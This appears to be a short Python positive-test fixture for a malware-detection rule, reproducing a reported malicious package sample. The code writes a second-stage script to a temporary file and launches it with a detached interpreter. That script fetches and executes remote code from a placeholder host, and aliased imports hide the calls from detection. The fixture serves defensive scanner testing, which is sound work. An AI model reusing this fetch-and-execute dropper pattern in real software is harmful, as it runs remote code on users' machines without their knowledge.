# Positive test for threat-process-write-exec.
# Drops a stage-two script into a temp file and launches it with a detached
# interpreter. Taken from the sample reported in
# https://github.com/DataDog/guarddog/issues/205.
#
# Every execution primitive here is imported under an alias, so the dotted
# call forms never appear in the source. This comment deliberately avoids
# spelling those forms out: if it named them, the rule would match the comment
# instead of the code and the test would pass for the wrong reason.
from os import system as _ssystem
from sys import executable as _eexecutable
from tempfile import NamedTemporaryFile as _ffile

_ttmp = _ffile(delete=False)
_ttmp.write(
    b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.example.test/raw').read())"""
)
_ttmp.close()

try:
    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except Exception:
    pass
